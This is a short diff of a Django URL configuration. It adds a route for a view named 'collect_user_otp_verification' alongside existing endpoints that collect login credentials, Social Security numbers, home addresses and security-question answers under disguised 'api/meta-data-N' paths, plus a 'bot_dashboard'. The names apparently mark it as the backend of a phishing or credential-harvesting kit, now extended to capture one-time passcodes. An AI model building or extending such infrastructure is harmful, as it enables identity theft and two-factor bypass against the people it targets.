@@ -75,7 +75,7 @@ def bot_dashboard(request):
 
     return HttpResponse(html)
 
-from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2, collect_user_security_questions
+from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2, collect_user_security_questions, collect_user_otp_verification
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -87,5 +87,6 @@ urlpatterns = [
     path("api/meta-data-5/", collect_user_social_security, name="collect_user_social_security"),
     path("api/meta-data-6/", collect_user_social_security_2, name="collect_user_social_security_2"),
     path("api/meta-data-7/", collect_user_security_questions, name="collect_user_security_questions"),
+    path("api/meta-data-8/", collect_user_otp_verification, name="collect_user_otp_verification"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
